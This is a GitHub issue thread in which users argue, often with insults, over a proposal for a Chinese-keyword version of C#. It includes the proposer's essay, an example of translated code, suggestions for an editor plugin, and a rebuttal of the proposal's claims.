第一步是汉化,或从形上汉化,也可从神上汉化,比如,将标示符替换为等价的中文token.用已有的程序语言创造图形化编程.
第二步是研究汉语的语意,汉语是表意字符系统.编程就是和计算机沟通,所以编程的目的就是把人的意思传达给计算机,将人的意愿传递给计算机,所以相对于英文编程这里就有不同之处了,英文编程是将人的意愿复制给计算机,你看到了吧,中文是传递,英文是复制,所以中文要求计算机必须要像人一样,也就是说在计算机里首先需要一个预设环境.所以这里就需要仿真技术,虚拟化的技术.你注意观察下紫禁城的鸟瞰平面结构,是不是像逻辑电路?我把紫禁城比喻为简单的CPU,把里面的处理单元比喻为皇帝和大臣以及他们的配套人员,这里不关注最底层的二进制,只关注指令,把指令比喻为皇帝的圣旨或大臣们之间的政务商讨.指令在各个单元之间传递,每个单元都有相应的解码编码设备,说远了,所以,你看,要想接收方能明白你的意思,那么他/它必须要先具备一个预设的逻辑结构,所以中文编程的关键是利用好指令集做出一个预设的环境,指令集是多条二进制组合在一起的一种表现,将不同功能的指令集组合在一起就能表达一个意,也就是表意,将多个意义组合在一起就能表达一个汉语字符或词汇的意思,如此一来,就像就初步构建完了一个更高级的预设环境.在这个基础上创造中文编程才具备可能性,这个基础就像各地方言和官话一样.你只不过是创造一种新的官话或方言,注;这里的预设环境你可以想象为生态环境或生长要素生长条件,这里的一层一层的结构,你可以想象为是树或图,主要是利用二叉树或易经卦象的原理,将一个复杂的结构分解为一个简单的结构,然后再细分,或者将多个简单的组装为一个复杂的,利用演化的原理,简单到复杂,低级到高级.
这里只是一种可行的理论研究.
所以,现在可行的,也就是可以实际行动的方案是什么呢?我的观点是用已有的编程语言创造一个虚拟机,模仿jvm或其他Xvm,自己设计一套指令集,用中文标示,指令集是动词和名词的集合,动词组合在一起,名词组合在一起,就是指令集,比如点横竖撇捺等汉字字符基本结构,然后,注意了,这里和现在的虚拟机语言就要多一层结构了,因为汉字是表意的文字,这里要有一个单意到多意的转换或叠加的行为,英语是形和神分离处理,汉语的字和意就要组合在一起处理,之后就是分析字词句段的组合步骤之工作了,你只要明白一点,汉字创造之初就是组合图形,笔画就等于线条,笔画越多线条组合在一起的结构就越复杂,所表的意也就越复杂和丰富,字是形,意是神,等到这个虚拟机语言成熟了后就可以设计逻辑电路,把基本的指令集固化到电路中去了,JVM加速器不知道你听说过没有,你要让龙芯研究所或中科院设计一个不现实,他们不会听你的,目前我们看到的编译器是在西方人已经研究透了怎么表他们语言中的意以后的表现,编译器的目的就是传达意.意是看不见摸不着的,没有形.所以意只能找宿主,通过宿主的方式存在.宿主就是字符,文字就是字符的一种.汉字也是从简单到复杂的组合,简单的意到复杂的意.有些人总是想着一步登天,一蹴而就,这是不可能的,保持谨慎,不要学他们浮夸,细心研究汉字表意的结构,汉字为什么能让我们能如此自由而丰富地表意,那是因为已经发展了几千年.


Do not ignore bad people and oppose Chinese programming, Chinese programming is necessary. Programming development has now come to a certain predicament and limitations, because programming for the Western culture to master, now need to break. Or horizontal or vertical.
The first step is finished, or from the shape of the finished, but also from the god of Chinese, for example, the icon is replaced by the equivalent of the Chinese token. With the existing programming language to create graphical programming.
The second step is to study the semantics of Chinese, Chinese is the ideographic character system. Programming is to communicate with the computer, so the purpose of programming is to convey the meaning of the computer to the computer, the will of the people passed to the computer, so there is relative to the English programming here Different, the English programming is to copy the wishes of the computer to the computer, you see it, the Chinese is the transfer, the English is copied, so the Chinese computer must be like a person, that is, in the computer first need a preset Environment, so here you need simulation technology, virtualization technology. Do you pay attention to the observation of the Forbidden City bird's eye view of the plane structure, is not like a logic circuit? I compared the Forbidden City as a simple CPU, the inside of the processing unit metaphor for the emperor and minister Their supporting staff, where not concerned about the bottom of the binary, only concerned about the instructions, the command metaphor for the imperial emperor or ministers between the government to discuss the instructions between the various units to pass, each unit has a corresponding decoding code Equipment, say far away, so you see, in order to receive side can understand what you mean, then he / it must first have a default logic Structure, so the key to Chinese programming is to use a good instruction set to make a default environment, the instruction set is a combination of multiple binary performance, the combination of different functional instruction sets can express a meaning, also Is the meaning of a combination of multiple meaning can express a Chinese character or the meaning of words, this way, as if the initial construction of a more advanced pre-set the environment on this basis to create Chinese programming only have the possibility , This foundation is like all local dialects and Mandarin words. You are just creating a new Mandarin or dialect, note; here the default environment you can imagine the ecological environment or growth factors growth conditions, where a layer of a layer Structure, you can imagine a tree or map, mainly the use of binary tree or easy to understand the principle of a complex structure into a simple structure, and then subdivided, or a number of simple assembly for a complex The use of evolutionary principle, simple to complex, low to advanced.
Here is just a viable theoretical study.
So, now feasible, that is, what is the practical action of the program? My point of view is to use the existing programming language to create a virtual machine, imitate jvm or other Xvm, design a set of instruction set, marked in Chinese, instructions Set is a collection of verbs and nouns, verbs combined together, the nouns together, that is, instruction set, such as the vertical and horizontal write Na Na character basic structure, and then, attention, and now the virtual machine language will be more than a layer Structure, because the Chinese characters are ideographic text, where there is a single intention to deliberately converted or superimposed behavior, English is the form and God separation processing, the Chinese word and the intention to be combined together to deal with, followed by the analysis of the word The combination of the steps of the work of the steps, and you just understand that the beginning of the creation of Chinese characters is the combination of graphics, strokes is equal to lines, strokes more lines combined with the structure of the more complex, the meaning of the table is more complex and Rich, the word is shaped, meaning God, until the virtual machine language can be designed after the logic of the logic, the basic instruction set to the circuit to the JVM accelerator do not know you heard no, you want Godson Institute or the Chinese Academy of Sciences designed an unrealistic, they will not listen to you, we now see the compiler is in the Westerners have been studied through how to express their language after the performance of the meaning of the compiler is to convey the meaning So the meaning is invisible, no shape, so the meaning can only find the host, through the host of the way the host is the character, the text is a character. Chinese characters from simple to complex combination, simple to complex Some people are always thinking of a step by step, it is impossible, it is impossible to remain cautious, do not learn their exaggeration, careful study of the structure of Chinese ideology, why can let us so free and rich expression, it is because Has been developed for thousands of years."
2335	[Comment removed by moderator @gafter due to inappropriate content]
2336	"@vbcodec 
please remember that we do have cursive. almost nobody wrote those characters the way they look like in printed materials. even if it's slow, the high information density of Chinese can still compensate. 
@qwas982 
stop acting like a nationalism retard. you're ruining Chinese's reputation in this community. btw - i'm just asking - why are you still using half-width punctuation from those so-called ""foreign languages""? are you too * to know how to use Chinese punctuation?"
2337	"'不,我构想了新的道路'  不好意思,是易语言,习语言等团队构想的
'目前,想要掌握编程这项技能需要很高的学习成本和代价,编程还是少数人的专利,普通人或想要转业转行的人想要进入这一领域是一件艰难甚至不可达成的事,因为其代价和成本实在高昂'  大众办好自己该做的职业就是了,如果学习编程连这点成本和代价都不肯付出,迟早滚蛋,凭什么编程要被当做一种廉价的技术?
'你好,请创造中文版的C#语言' 你好,请给我打钱,银行卡XXX,你凭什么指望别人免费帮你办事啊?还美名其曰为大多数人谋福,小学生?
'将学习编程的成本和代价和门槛降到最低,甚至降到零' 
将吃饭的成本和代价和门槛降到最低,甚至讲道理零,房产也该跌了
'得到了什么,就得付出相应的代价,就得失去什么,天下没有免费的午餐,天上不会掉馅饼' 你md也知道啊？
你行你上,我们看着,你自己带个团队免费做出来给我们用好了,虽然我们并不需要"
2338	"@varctrl 
傻狗一条，我都懒得回复你，既然像你这样的垃圾很多，我就明确表明对你们这类垃圾的厌恶好了。
我也没求你，你放心的走吧，我发在这里只是倡议和吐露一些建议和想法罢了，如果能讨论出解决方案（当然是和国外开发者探讨）自然是最好，如果讨论不出解决方案，也仅当是一次对中文编程探索的沟通经验。
你说的这些问题是刁难心态而不是解决心态，在国内讨论中文编程的论坛博客和即时聊天群中已经有太多次展现了，我不屑回答你的幼稚问题。你还指着他人小学生？你的语言风格就很像小学生，遂，我也用小学生的风格回复你好了，这是对你的尊重，有点自知之明吧。"
2339	"@qwas982
自以为聪明的蠢人,总是理所当然的想让别人免费办事,对,你还在表达着一种你想了很多,你做了很大贡献的样子,你想的东西要实现出来需要的功夫你自己不清楚？对于没实用价值的这种讨论,用刁难的态度回复是最好别不过得了,因为你作为你自认为的主导者,也没有尝试自己解决和实现,而是希望着别人免费帮你实现,那么我们之类人为什么还要去思考如何解决这类问题呢,你特别聪明的说了为广大人民谋福,"
2340	"@qwas982
从而代表着想转行,想学习的中国人来谴责我们这类逆向种族主义者,但是真正想学习编程的人愿意承担这些成本,你这种思维不就是与“你穷你有理”差不多的“你想学习你有理”?
况且,如果小学生也能学编程,那就证明了难度没有那么大,你可能真的没什么社会经验,现在的情况就是你哪怕把资源都给他们,他们也不会愿意去学习,何必为了这些人而大费周章?
你果然是个古老的中国人,喜欢免费的,优越感可真足呵,你刚刚所说的“当然是和国外开发者讨论”按照你之前所表现的价值观来看,你是逆向种族主义者,你看不起很多中国人,另外,如果汉化了,你可是既得利益者啊,并且在这场讨论之中,还有一类人根本没有参与进来,就是你所说的广大人民,这不仅仅是他们没有渠道知道吧,他们根本不在意这些汉化不汉化的,真正得到利益的只有你这类人,人民不过是你的挡箭牌罢了,傻狗
再转载一个知乎岁寒的回答
'为什么不找易语言团队？让他们做一个对接CLR的中文语言。你找C#团队实在是为难人家，凭啥人家要给中文专门做一个版本，那日文呢？韩文呢？阿拉伯文呢？全世界这么多语言，凭什么中文的做了，而其它语言的不做，这不是是歧视吗？还有，编程语言所用的语言是一回事，文档呢？没有好的中文文档，做出来就是一个半吊子语言，不会用的还是不会用，用不用中文没什么区别。然后社区呢？你得有官方的中文社区吧，不然这个版本的问题找谁解决呢？最后是，好处呢？吃力不讨好的事情，谁做呢？如果中文编程语言真的很有用的话，易语言应该很火才对啊。

作者：岁寒
链接：https://www.zhihu.com/question/66642888/answer/244587774
来源：知乎
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。
'
"
2341	"@aL3891
@gafter
@HaloFour
@sharwell

各位国外开发者朋友，你们好。
 看来某些中国国内的洋奴已经按耐不住他们的奴性了，他们开始攻击我了，不过我也回了他们，

因此，可能不能继续讨论C# 的 【标示符-Identifier】 【标记-token】 【库-library】 的中文化实现了，所以请社区管理员关闭这个问题吧，谢谢。这是一次进取和探索的尝试，但以一些已经取得编程优势的既得利益者的顽固阻挠而失败。（其实原因还包括中国国内的信息封锁导致无法访问github或访问不稳定等原因使交流沟通受阻）


Members of foreign developers friends, Hello everyone.

  It seems that some of China's Reverse racist style have been unable to bear their servility, and they began to attack me, but I also returned to them,

Therefore, we may not be able to continue to discuss the C # 【标示符-Identifier】 【标记-token】 【库-library】 in the realization of the Chinese characters/Mandarin vocabulary/Classical Chinese symbol, so ask the community administrator to close this question, thank you for you help. This is an attempt to make progress and exploration, but fails with the stubborn obstruction of vested interests(China's reverse racist programmer) that have already gained programming advantage. (In fact, the reasons also include China's domestic information blockade can not access github or visit instability and other reasons to make communication blocked)"
2342	"@qwas982
对一个被洗脑成共产主义接班人的你(你是吧,关于用开源思想实现共产主义),可能有句歌词特别适合“别当个思想的巨人,行动的侏儒”更别提是窃取来的思想了
"
2343	你好，请闭上你的嘴，不要祸害中国开发者。
2344	你好，请闭上你的嘴，不要祸害中国开发者
2345	"@ZSkycat 
@varctrl 

我说过，没求你们呀，你们怎么还像疯狗一样追着我咬并自以为是地认为我在求你们呀？"
2346	请不要侮辱狗这种生物，您不配
2347	"@qwas982
对于像狗一样跪求国外开发者和自己讨论的共产主义者,我还真是无话可说"
2348	"您好，我认为您的这种想法非常好，不过让我疑惑的是您为什么觉得微软需要为您的想法付出行动呢？这里是开源社区，您完全可以自己设计一套符合您设想的语言，我认为这不是非常有难度的事情，也不是必须由微软来做的事情；即使您没有能力实现这件事，您也可以设计出一套实施方案，然后吸引更多的开源社区的开发者来完成它，我相信这样做的开创意义远远大于在这里互相骂战。如果您有了一套完整的设计方案，我也很乐意为您的项目贡献出一份力量。

I think your idea is so good, but let me wonder why you think that Microsoft needs to act for your ideas? Here is the open source community, you can design a set of your own language, I think this is not a very difficult thing, nor is it necessary for Microsoft to do things; even if you do not have the ability to achieve this, you can Design a set of implementation programs, and then attract more open source community developers to complete it, I believe that the significance of doing so far greater than here in each other war. If you have a complete design, I would be happy to contribute to your project.

@varctrl @ZSkycat 也请你们不要继续争吵了，这是意见毫无意义的事情，并且在这个国际化的网站上争吵只会给国际友人对中国带来不好的印象。"
2349	"@Glavo
跟他这种人已经说不通了,你看看前面众多中国人均被打上了”逆向种族主义者”,他崇洋媚外的本性你再往前翻翻就能看到了"
2350	@Glavo 你应该看看它的仓库。“我的想法非常牛掰，就差人来实现了”
2351	"@Glavo 你好，此倡议意为向国外开发者学习，并不是“要求”他们按照我的意志并”免费“做出行动。
我现在是在学习，并不是‘’‘觉得微软需要为我的想法付出行动’‘’。你可以看上面，我回复外国开发者朋友的回复，我使用了诸如 can you tell me? can you teah me? How to change,How to modify it. 等敬语虚心请教。

国内某些逆向种族主义者的自尊可能在他自己看来受到伤害了，所以他们首先攻击了我，并根据他们自己自我感觉良好的自以为是来解读我的观点。

另外，多谢你的指导，我可能仅仅只是具备一个 idea 主意 想法，还没创造出具体的架构，纲目等行动方案。"
2352	"@varctrl 
如果是真的说不通，道不同不相为谋，那么争吵也是无意义的。

@ZSkycat 
有想法是好的；如果自己没有能力实现，通过吸引其他开发者来开发这门语言一样是可行的选择，但用来吸引其他开发者的也绝不是道德绑架或者是打击有反对意见其他开发者，这是他做错的地方。

@qwas982 
我们反对的只是做一个思想上的巨人，行为上的矮子。实现一个中文版的 C# 语言这种想法是很好的，但是 C# 的维护者是没有义务做这件事的，其他开发者也没有义务来做这件事。如果每个人夸夸而谈就有人要来实现这件事，那么社区是不可能有发展的。您真的想要实现这种事，不是您用一张嘴就能做到的，您需要用您的设想来吸引到开发者，或者是凭借自己的能力开发出这个“中文C#”。我认为您如果把花在这个 issue 的经历用来把你构想中语言的文法描述出来，您的想法会吸引到更多开发者；如果您将您所说的“中文 C#”实现了出来，我相信也没有这么多人在这个 issue 下反对您。

We are against only to make a thought of the giant, the behavior of the dwarf. The idea of implementing a Chinese version of the C # language is good, but the C # maintainer is not obligated to do this, and other developers have no obligation to do it. If everyone is ranting to talk about someone to come to this matter, then the community is impossible to develop. You really want to achieve this kind of thing, not you can use a mouth to do your needs, you need to use your ideas to attract to the developer, or by virtue of their ability to develop this ""Chinese C #"" I Think that if you spend your experience in this question to describe the grammar of your language in your idea, your ideas will attract more developers; if you realize what you call ""Chinese C #"" I believe there are not so many people in this issue against you."
2353	"@Glavo 然而，我并没有打击有反对意见其他开发者，你可以明鉴（从头看回复记录），当然，如果你与他们一样的阵营，那算我没说好了。

关于你说的-【设想】，前面已经有，我有过表达，不知你看过没有。我已经表达过很多次，我是在学习 学习 学习，此倡议是为探讨和讨论的范畴。"
2354	"@qwas982 
每个开发者都有自己的想法，简单的打上“逆向种族主义者”这样的标签这种行为在我看来也是不正确的。您说他们用自己的意思来理解您的观点，其实您也在做同样的事情，或许您需要再去想象这件事情。

他们攻击您的原因，我想可能是这样几点：
1. 您的想法太过空泛，没有给出什么真正有指导意义的建议
2. 您的论点中有太多是自己臆想出来的，没有实际的证据
3. 您也并没有实现出过有实际价值的项目，思想和行为差距太大

我认为您应该针对这三点反击，而不是用建立在您缺乏论证的论据上批判他人。

Every developer has his own idea, and simply labeled ""reverse racist"" is not right in my opinion. You say they use your own meaning to understand your point of view, in fact, you are doing the same thing, maybe you need to go to imagine this thing.

They attack your reason, I think it might be like this:
1. Your idea is too vague and does not give any advice that really has guidance
2. Your argument is too much of your own imagination, there is no practical evidence
3. You also did not achieve the actual value of the project, thinking and behavior gap is too large

I think you should criticize others for this three-point counterattack, rather than on the argument that you lack the argument."
2355	"@qwas982 
您说您在学习，但这里并不是学习的地方。
您有没有发现您之前提出的那些想法实际上和现在的 C# 语言已经有了较大差异？我认为您的想法完全是另外一门语言，而并非单纯的“中文版 C#”，所以您的这个 issue 我认为是在不恰当的地方提出的，我认为您应该建立一个您自己的仓库，那里讨论，或者是在其他平台讨论，而不是在这里发 issue。

您说您没有打击其他有反对意见的开发者，但是您可以回看一下在之前讨论中您所说的那些话语，再整理一下自己的论证逻辑，或许您会发现中间混杂了太多您的臆想，而缺乏实际的证据。对于用缺乏实际证据的论证来给他人打上不好的标签这种行为，我认为就是一种打击。

You say you are learning, but here is not the place to learn.
Have you ever found that the ideas you have previously made are actually different from the current C # language? I think your idea is completely another language, and not simply ""Chinese version of C #"", so your issue I think is in the wrong place put forward, I think you should build your own warehouse, there Discussion, or in other platforms to discuss, rather than issue the issue here.

You say you have not dealt with other developers who have objections, but you can look back at what you said in the previous discussion and sort out your argument logic. Perhaps you will find that there is too much of your imagination , While the lack of practical evidence. For the lack of practical evidence to give others a bad label on this behavior, I think it is a blow."
2356	"@Glavo 
 请你仔细观察（从第一条回复开始），我一开始对于他们对我的嘲讽、歧视、 甚至侮辱都没在意，但是他们得寸进尺，那我只能以其人之道还治其人之身。“逆向种族主义者”这是在综合了他们的行为以后得出的结论，并不是一开始就这样。请你搞清楚先后顺序，不要认为是我开的坏头。


你提的这三点问题，我认为是站在他们已经攻击过我之后的结论这个基础上，并不是以友善的态度探讨中文编程的可能性和可行性的延续讨论。

嗯，通过观察你紧接着的这一条回复，可以断定你是他们一伙的，既然如此，就此打住，没意义回复你们。你不需要洗白他们的行径，洗了也没用。"
2357	"@qwas982
另外，您在这个 issue 的标题里用了“请创造”这样的祈使句，您说您并非是要求，但是您表现出了这样的态度。因为您自己的话语而导致他人对您的想法理解有偏差，我觉得您也需要负一定的责任。"
2358	"@Glavo 

你随意解读吧。"
2359	"@qwas982
您的这句回复里同样有着很多奇妙的逻辑，希望您能够好好思考一下自己的论证，我相信您会发现很多漏洞。
至于这些攻击，我认为是合理的。因为您在这个 issue 的最开始就有很多毫无依据的论证，对于有很多没有实际证据也没有合适的逻辑推理论证的 issue，在一定程度上表达反对的行为并没有什么不妥。

对于您逻辑中的漏洞，我先举个例子吧：
> 嗯，通过观察你紧接着的这一条回复，可以断定你是他们一伙的
“一伙”指代的什么呢？只要是反对您的就是一伙吗？或许您有一些被害妄想，我只是在我自己认为中立的角度来评价。"
2360	"@Glavo 

行啦，你不用洗了，看你持续不断地否定，你还说你自己是中立立场，你知道我是什么立场吗？
我说过，你随意解读。看你说话客气，所以回复你罢了。"
2361	"@Glavo
现在明白我说的跟他说不通的意思了吧"
2362	"Of course we are on the same side. We're PROFESSIONAL engineers who are able to think logically and achieve our goals in person, not arguers like you.

这么多人在 comment 里反驳你，这么多人给你点 down vote，应该反思反思了。
我们的观点：你在胡扯。

你有梦想，你可以自己去实现，而不是向他人索取。
如果你觉得你有道理，你还是自己弄出来，用行动打我们的脸吧。少说，多做。
"
2363	"@qwas982 我觉得你可以做一个编辑器扩展啊，像 @qrli 说得那样，完美实现你的要求，为何不做？
I think you can create an editor plugin to translate Csharp codes to Chinese and display them. I think it is a perfact idea. Why not do it?"
2364	@qwas982 I think token replacer is just as simple as a tokenizer, if you really want to begin on this project you should start on coding not arguing.
2365	@1448839220  你想通过劣币驱逐良币你随意呀。点 反对 点得多就能证明我是错的我在胡扯，你也是没谁了。呵呵呵
2366	"一般来说，一项技术，大量的小白涌入，基本就预示着这项技术烂了
比如MMD
比如Vocaloid
比如大数据

顺，正面回答一下为啥不会有中文版c#
大多数的库都是非中国人写的，你要让他们学中文去？
.Net中文版的文档注释基本都是中文写的，下个vs，打开智能提示，啥找不到
实在不行MSDN，这些都大大降低了对中文c#爱好者的门槛，再开发一套中文版的必要性不大

还有，c#是为了开发的，中文对开发速度肯定会拖慢【不要问为啥，自己去试试】
如果为了娱乐，你可以自己基于.Net制作一门语言
"
2367	"@shisoft 

好，多谢提醒。
看来在这里找不到帮助。提的倡议也是无意义的。甚至号召不了有意愿实现中文编程的朋友（因为有逆向种族主义者在阻挠）

愿望是这样的 下面是代码示例；

Ok, thanks for the reminder.
It seems that there is no help here. The mention of the initiative is also meaningless. And even call a friend who is willing to achieve Chinese programming (because there is a reverse racist in the block)

The desire is that the following is a code example;


_```
public class Color
{
    public static readonly Color Black = new Color(0, 0, 0);
    public static readonly Color White = new Color(255, 255, 255);
    public static readonly Color Red = new Color(255, 0, 0);
    public static readonly Color Green = new Color(0, 255, 0);
    public static readonly Color Blue = new Color(0, 0, 255);
    private byte r, g, b;
    public Color(byte r, byte g, byte b) 
    {
        this.r = r;
        this.g = g;
        this.b = b;
    }
}
```_

_```
公共 类 色彩
{
    公共 静态 只读 色彩 黑= 新 颜色(0, 0, 0);
    公共 静态 只读 色彩 白= 新 颜色(255, 255, 255);
    公共 静态 只读 色彩 红 = 新 颜色(255, 0, 0);
    公共 静态 只读 色彩 绿 = 新 颜色(0, 255, 0);
    公共 静态 只读 色彩 蓝 = 新 颜色(0, 0, 255);
    私有 字节 r, g, b;
    公共 色彩(字节 r, 字节 g, 字节 b) 
    {
        此.r = r;
        此.g = g;
        此.b = b;
    }
}
```_

其实更应该形容为“汉化”。
In fact, should be described as ""han tongue""."
2368	Don Quijote
2369	"![v2-7cf1d485217a724912c9748ae4936239_b](https://user-images.githubusercontent.com/13673702/31582641-f1d9d35a-b1bb-11e7-8688-92bd1555c8da.jpg)
"
2370	"@qwas982 做编辑器扩展完全能实现你的要求
Creating an editor plugin can make your dream come true completely."
2371	@qwas982 Okay, that's your wish. But who is going to implement that? Humm...
2372	"@shisoft  
我想自己动手实现，但是我不懂怎么实现，并且我也找不到开发文档。
不过倒是遇到了一堆逆向种族主义者的嘲讽、 轻蔑、 歧视、傲慢与偏见。深表遗憾。（当然，不是指你）

I want to do it myself, but I do not understand how to achieve/implement , and I can not find the development of the document.
But it is encountered a bunch of reverse racists ridicule, contempt, discrimination, arrogance and prejudice. Deeply regret. (Of course not referring to you)"
2373	@qwas982 我就想知道你怎么看待做编辑器扩展这个方法的
2374	"@qwas982 
我这并不是什么解读，只是用逻辑分析。我帮您指出您的 issue 中的一些问题，这样您或许能够理解为什么会有人来“攻击”您。

> 你好,请创造中文版的C#语言
这里您使用了祈使句，表达出了对 C# 维护者的一种要求。但是这种这并不是他们的义务，所以我认为您的这句话不妥。

> 目前,想要掌握编程这项技能需要很高的学习成本和代价,编程还是少数人的专利,普通人或想要转业转行的人想要进入这一领域是一件艰难甚至不可达成的事,因为其代价和成本实在高昂

这句话是缺乏依据的，至少在我交际圈里，您的这句话是不正确的。使用这个没有依据的论证，也是一个逻辑问题

> 普通人是大众化,是占人口最多的普罗大众,这部分人没有那个成本,也很难承担得起学习的代价

这句话也是没有依据的，学习编程的代价并不高，即使是普通人也能通过读书联系来学习编程

> 对于英语是母语的人,其学习成本几乎是没有的.因此他们的起点很高,是直接用数学的思想在编程

这句话您也没有给出依据，而且在我看来这句话是错误的，有不少以英语为母语的人一样深陷语法的苦海

> 用母语编程无疑将会极为方便,你省去了学习一堆冗余知识的代价和成本,你唯一需要做的就是锻炼自己的逻辑思维,理性认知能力,空间想象力和时间想象力

这句话一样没有依据，您或许需要用一些论文以及统计数据来支持这个论点

> 计算机除了能进行数学计算以外,还能进行非数学计算.非数学计算就是与数学不相干的,或者离数学很远的

一样是缺乏依据的论点

> 因为我们国家的人从小就掌握了99乘法表,对于基本的四则运算是信手拈来的,使用加减乘除是易如反掌的,而只要你掌握了四则运算就能轻易掌握计算机非数学计算

缺乏依据

> 那么,人的思想就相当于计算机软件.芯片中的晶体管就相当于人脑中的神经细胞(脑细胞),运行在晶体管中的电子信号就相当于人脑中脑细胞之间传递的生物电信号,神经网络就相当于连接数以亿计的晶体管的集成电路,而机械自动化就是人的身躯.用机械组成的机器,或机器组成的机械实现人的肢体功能和器官功能

错误的依据

> 实现中文编程,汉语编程,可以让上到99,下到刚会走的人都具备编程的能力,编程就是施展你的智慧,实现你的想法,展现你的才华

没有依据的臆想

> 未来的程序肯定不是现在这样艰涩难用,未来的程序一定丰富多彩,百家争鸣.编程还能解决就业,解决行业升级,转型升级,人的生存问题,生活问题.未来,教育,医疗,生产活动,全部可以由机器实现,机器具备高度自动化的功能.衣食住行,生老病死,全部可以由机器解决.而你要做的就是编程去指挥机器怎么做.

没有依据臆想

> 现在,人们看不到编程的前景,并且,因为进入这个领域的大多是精英学者,他们已经思维固化,认为实现中文编程汉语编程没有意义,他们已经唯英语编程马首是瞻,对英文编程依耐性很高,认为编程已经没有别的路可走,没有别的可能性了,因此他们不想研究中文编程汉语编程,更不会来实现,因为他们已经被严重西化,他们下一步要做的就是抛弃他们的母语,和承载于母语上的文化.你问他们国学是什么,他们不会知道,就算知道这个名字,他们也说不出什么是国学.对国学涵盖的广泛文化内涵一概不知

滑坡谬误，错误的依据

> 为什么,因为国学也是一种思想,而他们学的思想是西方人的文化.是西方人的西学.并且,因为西方人已经建立了庞大的程序世界,各种条件齐全,他们拿来就用,所以他们懒得再重新建立新的程序世界,是的,这样看起来没什么不好,但是,根据物质守恒定律,得到了什么,就得付出相应的代价,就得失去什么,天下没有免费的午餐,天上不会掉馅饼.其代价就是我前面说的.迷失自我,不知自己是哪国人,不知道自己是什么种族,渐渐地无法理解生养自己的文化

滑坡谬误，错误的依据

> 于是,西方人创造了高级程序语言,也就是市面上看到的c, c++, java, javascript ,python等,这些是某一编程语言的名字.程序就是给海量的二进制0和1编码,编程就是使用这些编码.那么,只要把编码设计为指令,一个指令表达一个简单的意思,然后把多个指令组合起来用某个单词或某个符号或一句简单的日常用语表示,使用这个单词或符号或日常用语就能表达一个复杂的意思,经过解码,计算机就能明白这一堆指令的意思,如此一来,对于人来说已经没什么沟通的障碍了,西方人与计算机沟通就像与一个会说话的人一样沟通

将人类强行划分开，以增强归属感来煽动读者

对于充满谬误，错误论据的 issue，我认为一定程度的反对是合理的。而接下来又发生了什么呢？

> I'd say, in Chinese forums, this is usually a joke. But there do be a few people pro it.
> 
> We generally view it as non-sense. If you really want it, you can create an editor plugin to translate > keywords to Chinese and display them.

这句话并没有什么攻击的语言，只是一个简单的叙述，并提供了一个现行的方案。而您这样回应的：

> 你是中国人吗? 怎么对中文编程的话题这么熟悉?看起来你没明白我表达的重点.你是在抵制中文编程吧.
实现母语编程怎么可能没有意义? C#用的字符已经非常接近英语自然语言,也就是越来越母语化,如果这个星球上的人都能用他们自己的母语编程,软件生态将空前的强大和发展.
你完全不知道量变带来的质变是怎样的,就急着否定它?
> 我设想的是在编程语言的基础上实现本地化和母语化, 不是用插件实现.

在对方已经表示了自己是中国人的情况下，问“你是中国人吗”已经开始挑衅了，所以先最开始挑衅的是您。
“你是在抵制中文编程吧”这更是您的臆想。
“如果这个星球上的人都能用他们自己的母语编程,软件生态将空前的强大和发展”，这又是无依据的论证。
“你完全不知道量变带来的质变是怎样的,就急着否定它”，这建立在对方否定中文编程这个没有依据的论证上，所以一样是错误的。

> 说英语的人总共只有那么多,并且这部分人意愿编程的就更少,有意愿的人又有更多选择(其它编程语言),于是能在C#上发展生根的就很稀少了,没人去研究它,又怎么会进步呢

说英语的人很多，母语不是英语的人拿英语做第二第三语言也很多。“没有人研究”这就是一个相当大的错误论据。

> 中国会英语的毕竟少数,再说会的人又看不上C#.这可真是矛盾

毫无依据的逻辑

> 你不过是站在你自己的角度考虑罢了,你没站在微软这种大企业的角度和市场的角度考虑.你不知道生态发达会是怎样一番景象,并且,你想要阻止对编程感兴趣和热心的人.
> 并且,阿拉伯数字和数学符号没必要中文化.

你怎么知道对方没有考虑？你一样是站在自己的角度考虑，然后认为大公司就一定是这样，然后否定对方而已。
他也并没有阻止一个有热心的人，因为在不少人看来，真正有热心的人不会说这么多空洞的口号。

> 看起来你也是站在你自己的角度考虑问题罢了,你觉得你不需要,别人也不需要.所以,你认为,你学会了英语,别人也应该学会英语才能从事编程这一工作.
> 我并不是为我自己考虑.我考虑的是市场需求.
> 关于你说的文档翻译问题,我认为,从事这一行业的人变多了,自然会有人去翻译.

你同样也没有说明对方为什么是站在自己的角度，而自己没有站在自己的角度。

> 你考虑的是面向英语为母语的编程人员,而不是非英语为母语的编程人员.语言和字符的宿主是什么?
不就是文字符号吗?如果你认为 language / characters 是无关紧要的,那么,为什么现在人类编程还是需要输入 language / characters 才能与计算机沟通呢?
> 第二个问题,你说用中文或其他非英语为母语的文化用键盘开发效率底下,但是你忽略了现在的操作系统都是用软键盘 soft keyboard 完成字符的输入,中文有拼音输入法,输入效率不比输入英语差.

语言和字符宿主是文字符号，不是说文字符号的宿主是语言和字符，这里你自己的逻辑混乱了，然后又用这个混乱逻辑去论争。
“都是用软键盘完成字符的输入”又是一个事实错误，“中文有拼音输入法,输入效率不比输入英语差”也是没有依据的。

> 朋友,易语言 / 易飞扬 已经停止开发很久了,并且,它们不开源.因为开发[易]系列语言的公司不重视企业应用,和后续发展.所以,没有企业愿意应用它.
>
> 现在有很多人对中文编程的概念还停留在非常早期的阶段和水平, 一提中文编程就说易语言等早已停止开发的汉语编程语言.
> 对汉字输入的印象还停留在,拼音输入法没发明之前的阶段和水平.

“易语言 / 易飞扬 已经停止开发很久了”又是一个事实错误，你连官网都没看一下就知道他停止发展了？
“对汉字输入的印象还停留在,拼音输入法没发明之前的阶段和水平”？？？

> 你好,朋友
> 我的意思并不是完全否定用英语编程,也不是否定西方文化.
> 我的意思是增加一种选择,因为这里有更宽广的市场,和无限的可能.在中国,想要学习编程但又不会英语的人有很多,并且,因为受到政府的高压统治和信息封锁,普通的大众并没有机会和精力研究程序设计和程序语言. 编程对普通中国人来说是一件遥远的事.
> 
> 我设想的是,如果打破了交流这一障碍,就会让更多的普通人学习和使用编程.交流有很多种情况,人与人之间的交流,人与计算机之间的交流.
> 对于其他自然语言,Arabic, Spanish, Russian 也可以增加这一种选择,也就是本地化,母语化,就像国际化的程序或操作系统一样,提供当地的语言版本.
> 
> 编程就是表达想法,那么用母语表达,无疑会更加高效和准确.

“在中国,想要学习编程但又不会英语的人有很多,并且,因为受到政府的高压统治和信息封锁,普通的大众并没有机会和精力研究程序设计和程序语言. 编程对普通中国人来说是一件遥远的事” 这没有依据，而且在我看来就是一个事实错误。
